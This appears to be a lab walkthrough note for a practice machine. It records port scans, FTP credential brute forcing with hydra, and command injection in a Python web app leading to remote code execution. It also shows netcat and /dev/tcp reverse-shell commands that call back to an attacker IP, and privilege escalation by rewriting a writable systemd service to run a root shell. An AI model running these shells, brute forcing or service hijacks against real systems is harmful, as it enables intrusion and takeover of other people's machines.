### Enumeration
```
IP=192.168.170.117
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p21,22,80,139,445,18000,50000 -A $IP
```
### Ports 
- 21
	- vsftpd 3.0.3
- 22
	- OpenSSH 8.0 (protocol 2.0)
- 80
	- Apache httpd 2.4.37 ((centos))
- 139
	- netbios-ssn Samba smbd 4.6.2
- 445
	- netbios-ssn Samba smbd 4.6.2
- 18000
	- biimenu?
- 50000
	- Werkzeug httpd 1.0.1 (Python 3.6.8)
### Foothold
- 21
	- ftp anonymous@$IP
		- login successful
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
		- anonymous:anonymous
		- ftp:b1uRR3
		- ftp:ftp
- RPC/ SMB
	- enum4linux -U $IP
		- nothing
- 445
	- smbclient -N -L //$IP
		- anonymous login success
		- shares
			- print$
			- Cmeeks
			- IPC$
	- nmap --script smb-vuln* -p135,139,445 $IP
		- not vulnerable
- 80
	- Default landing page
		- ![[Pasted image 20240711102949.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
			- nothing
- 18000
	- Default landing page
		- ![[Pasted image 20240711103000.png]]
	- Versions
	- Login
		- Tried 
			- admin:admin  -  failed
			- admin':admin  -  failed
		- Registration needs invite code
	- Directory Brute force
		- dirsearch -u http://$IP:18000
			- slow to search
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP:18000/FUZZ
- 50000
	- Default landing page
		- ![[Pasted image 20240711103009.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP:50000
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP:50000/FUZZ
			- /verify
		- Found directories
			- /generate
				- {'email@domain'}
			- /verify
				- {'code'}
				- Can change to POST and set data to  code
				- ![[Pasted image 20240711111453.png]]
				- Can send some commands to host
				- ![[Pasted image 20240711111810.png]]
				- Can maybe put os.system commands
				- ![[Pasted image 20240711112055.png]]
				- Maybe we can use a rev shell
				- `nc 192.168.45.195 80 -e /bin/bash`  >  RCE
### PE
#### Linux
- cmeeks
	- id
		- uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
	- sudo -l
		- (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
	- uname -a
		- Linux hetemit 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- ![[Pasted image 20240711112317.png]]
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- cmeeks
	- linpeas
		- Service
			- /etc/systemd/system/multi-user.target.wants/pythonapp.service
				- lrwxrwxrwx
				- we can probably overwrite with malicious code
				- Will add to pythonapp.service `ExecStart=/tmp/shell.sh`
				- echo 'nc 192.168.45.195 22 -e /bin/bash' > shell.sh
					- did not work
				- ExecStart=/bin/bash -c ‘bash -i >& /dev/tcp/192.168.45.161/50000 0>&1’
				- User=root
				- ![[Pasted image 20240711132603.png]]
			- /etc/systemd/system/pythonapp.service
				- -rw-rw-r--
### Credentials
### Lessons Learned